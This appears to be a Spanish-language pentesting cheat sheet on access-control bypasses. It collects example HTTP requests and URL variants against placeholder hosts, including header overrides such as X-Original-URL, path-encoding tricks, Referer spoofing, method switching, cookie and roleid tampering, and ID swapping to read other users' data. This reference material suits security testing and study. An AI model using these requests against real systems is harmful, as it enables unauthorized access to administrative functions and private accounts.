# Access Control

## Summary 

* [Bypass 401 and 403](#bypass-401-and-403)
* [Escalada Vertical](#escalada-vertical)
	* [Funcionalidad Desprotegida](#funcionalidad-desprotegida)
	* [Accesos Basados en Parámetros](#accesos-basados-en-parametros)
	* [Reutilizar Parámetros de Response](#reutilizar-paramestros-de-response)
	* [Configuración Incorrecta de la Aplicación](#configuracion-incorrecta-de-la-aplicacion)
	* [Referer Header 1](#referer-header-1)
	* [Cambio de Métodos HTTP](#cambio-de-metodos-http)
* [Escalada Horizontal](#escalada-horizontal)
	* [ID Por Parámetro](#id-por-parametro)
	* [Datos en Redirección 302](#datos-en-redireccion-302)
	* [Referer Header 2](#referer-header-2)


## Bypass 401 and 403

<img src="https://user-images.githubusercontent.com/43796175/117718216-6e1a4b00-b1a1-11eb-881c-53a8dc593102.jpg">

### Bypass con `X-Original-URL`
```html
GET /admin
Host: vulnerable.com --> 403 Forbidden

GET /anything
Host: vulnerable.com
X-Original-URL: /admin --> 200 OK
```

### Bypass con `%2e` (`.`)

```html
https://vulnerable.com/path --> 403 Forbidden

https://vulnerable.com/%2e/path --> 200 OK
```

### Bypass de Retroceso

```html
/admin/panel/ --> 403 Forbidden
/admin/monitor/ --> 200 OK
```

Entonces

```html
/admin/monitor/;panel --> 200 OK
```

### Bypass con `Custom-IP`

```html
GET /delete?user=test --> 401 Unauthorized

GET /delete?user=test
X-Custom-IP-Authorization: 127.0.0.1 --> 302 Found
```

### Bypass con `/` y `.`

```html
vulnerable.com/admin	  --> 403
vulnerable.com/admin/.	  --> 200
vulnerable.com//admin//	  --> 200
vulnerable.com/./admin/./ --> 200
```

### Bypass con `;`

```html
https://vulnerable.com/admin/	 --> 302
https://vulnerable.com/admin..;/ --> 200
```

### Bypass con Extensiones

```html
https://vulnerable.com/api/v1/users/[victimID] --> 401 Unauthorized
https://vulnerable.com/api/v1/users/[victimID].json --> 200 OK
```

```html
https://vulnerable.com/api/v1/users/[victimID] --> 401 Unauthorized
https://vulnerable.com/api/v1/users/[victimID]? --> 200 OK
```

### Bypass de Paths

```html
https://vulnerable.com/api/v1/users/[victimID] --> 401 Unauthorized
https://vulnerable.com/api/v1/users/[victimID]\..\.\index.html --> 200 OK
```

```html
https://vulnerable.com/secret --> 403 Forbidden
https://vulnerable.com/secret/* --> 200 OK
https://vulnerable.com/secret/./ --> 200 OK
```

### Bypass Version API

```html
https://vulnerable.com/api/v3/users/[victimID] --> 401 Unauthorized

https://vulnerable.com/api/v1/users/[victimID] --> 200 OK
```

```html
https://vulnerable.com/api/v1/users/[victimID] --> 401 Unauthorized

https://vulnerable.com/api/v2/users/[victimID] --> 200 OK
```

### Bypass de Variables

```html
https://vulnerable.com/api/v1/users/[victimID] --> 401 Unauthorized

https://vulnerable.com/api/v1/users/[victimID]&accountDetails --> 200 OK
```

```html
https://vulnerable.com/api/v1/users/[victimID] --> 401 Unauthorized

https://vulnerable.com/api/v1/users/[yourID]&[victimID] --> 200 OK
```

```html
https://vulnerable.com/api/v1/users/victim?id=[value] --> 401 Unauthorized

https://vulnerable.com/api/v1/users/your?id=[value]&victim?id=[value] --> 200 OK
```

```html
https://vulnerable.com/api/v1/users/victimID --> 401 Unauthorized

https://vulnerable.com/api/v1/users/victimID/email --> 200 OK
```

### Bypass File

```html
https://vulnerable.com/secret.txt -->  403 Forbidden
https://vulnerable.com/secret.txt/ -->  200 OK
https://vulnerable.com/%2f/secret.txt/ -->  200 OK
```

### Bypass Protocol

Try to use cURL

```html
https://vulnerable.com/secret -->  403 Forbidden
http://vulnerable.com/secret -->  200 OK
```



## Escalada Vertical

### Funcionalidad Desprotegida

Cuando una aplicación no aplica ninguna protección sobre la funcionalidad sensible.

```
https://insecure-website.com/admin
```

Es recomendable buscar en los "scripts" de toda la aplicación para encontrar rutas ocultas en parámetros "href" por ejemplo:

```
https://insecure-website.com/administrator-panel-yb556
```

Hacer uso de Burpsuite:

***"Target --> Site Map --> Engagement tools --> Find scripts"***


### Accesos Basados en Parámetros

Algunas aplicaciones determinan los derechos de acceso o el rol del usuario al iniciar sesión y luego almacenan esta información en una ubicación controlable por el usuario, como un campo oculto, una cookie o un parámetro de cadena de consulta preestablecido.

```
https://insecure-website.com/login/home.jsp?admin=true
https://insecure-website.com/login/home.jsp?role=1
```

Por ejemplo, setear una cookie en "true":

Acceso Denegado:

```
GET /admin HTTP/1.1
Host: vulnerable.com
Cookie: session=O8eaMRkHqbH565ceSa9qdOBcOrfwaiUL; Admin=false
```

Acceso Concedido:

```
GET /admin HTTP/1.1
Host: vulnerable.com
Cookie: session=O8eaMRkHqbH565ceSa9qdOBcOrfwaiUL; Admin=true
```

### Reutilizar Parámetros de Response

Actualice su email de usuario:

```
{"email":"asd@asd.qasd"}
```

Y verá en la response:

```
{
  "username": "wiener",
  "email": "asd@asd.qasd",
  "apikey": "AupmGEAsvqrLJbDlkadP6RIJIjskZrJG",
  "roleid": 1
}
```

Ahora, agregue el parámetro "roleid: 2" en la request que envió previamente:

```
{"email":"asd@asd.qasd", "roleid": 2}
```

La respuesta ahora es:

```
{
  "username": "wiener",
  "email": "asd@asd.qasd",
  "apikey": "AupmGEAsvqrLJbDlkadP6RIJIjskZrJG",
  "roleid": 2
}
```

Luego, escaló a usuario Administrator.

### Configuración Incorrecta de la Aplicación

Pruebe enviar los headers:

```
X-Original-URL: /cgonzalo
X-Rewrite-URL: /cgonzalo
```

Si obtiene:

```
HTTP/1.1 404 Not Found
...

"Not Found"
```

La aplicación interpreta correctamente estos headers y puede ingresar a recursos privados.

Algunas aplicaciones imponen controles de acceso en la capa de la plataforma al restringir el acceso a URL específicas y métodos HTTP según la función del usuario.

Por ejemplo, una aplicación puede configurar reglas como las siguientes:

```
DENY: POST, /admin/deleteUser, managers
```

Esta regla niega el acceso al método POST en la URL ``` /admin/deleteUser``` a los usuarios del grupo de administradores. Varias cosas pueden salir mal en esta situación, dando lugar a omisiones de control de acceso.

Algunos frameworks admiten varios encabezados HTTP no estándar que se pueden usar para anular la URL en la solicitud original, como ```X-Original-URL``` y ```X-Rewrite-URL```. 

Si un sitio web utiliza rigurosos controles de interfaz para restringir el acceso según la URL, pero la aplicación permite que la URL se anule mediante un encabezado de solicitud, entonces es posible que se omitan los controles de acceso mediante una solicitud como la siguiente:

```
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
...
```

Intente cargar un recurso privado, por ejemplo, ```/admin``` y observe que se bloquea. Tenga en cuenta que la respuesta es muy sencilla o básica, en formato JSON por ejemplo, lo que sugiere que puede originarse en un sistema de interfaz de usuario.

Envíe la request con el header "X-Original-URL":

```
GET / HTTP/1.1
Host: victim.com
X-Original-URL: /cgonzalo
```

La response devuelve:

```
HTTP/1.1 404 Not Found
...

"Not Found"
```

Ahora cambie la solicitud:

```
GET /admin HTTP/1.1
Host: victim.com
X-Original-URL: /cgonzalo
```

Y obtiene:

```
HTTP/1.1 200 OK
```

### Referer Header

Si obtiene 403 o 401:

```
// Access Denied
GET /api/getUser HTTP/1.1
Host: test.com --> 403 Forbidden
```

Intente:

```
GET / HTTP/1.1
Host: test.com
Referer: https://site.com/api/getUser --> 200 OK
```

o:

```
GET /api/getUser HTTP/1.1
Host: test.com
Referer: https://site.com/api/getUser --> 200 OK
```

### Cambio de Métodos HTTP

Si alguna request le da un 401 Unauthorized:

```
POST /admin-roles
Host: vulnerable.com

username=wiener&action=upgrade
```

Intente cambiar el método HTTP, a GET por ejemplo:

```
GET /admin-roles?username=wiener&action=upgrade
Host: vulnerable.com
```

## Escalada Horizontal

Surge cuando un usuario puede obtener acceso a recursos que pertenecen a otro usuario, en lugar de sus propios recursos de ese tipo.

### ID por Parámetro

Si al visitar su perfil, la petición se realiza por "nombre de usuario", cambie este al de la víctima:

```
// 200 OK
GET /my-account?id=wiener
Host: victim.com
```

```
// 200 OK
GET /my-account?id=admin
Host: victim.com
```

### Datos en Redirección 302

A veces cambiar el parámetro nos devuelve una redirección debido a que la aplicación protege estos ataques, pero sin embargo los datos del usuario víctima se pueden visualizar antes de continuar con esta redirección 302.

Envié la solicitud:

```
GET /my-account?id=admin HTTP/1.1
Host: victim.com
```

Y verá los datos sensibles antes de continuar:

```
HTTP/1.1 302 Found
...

<p>Your username is: admin</p>
```

### Referer Header 2

El encabezado "Referer" puede bypassear los controles de acceso.

```
// 200 OK like admin user
GET /admin-roles?username=myuser&action=upgrade HTTP/1.1
Host: victim.com
Cookie: session=[cookieAdmin]
```

```
// 200 OK like low privilege user and referer
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: victim.com
Cookie: session=[cookieUser]
Referer: https://victim.com/admin
```

El header "Referer" está apuntando al edpoint `https://victim.com/admin` el cual referencia a la request a ese recurso.


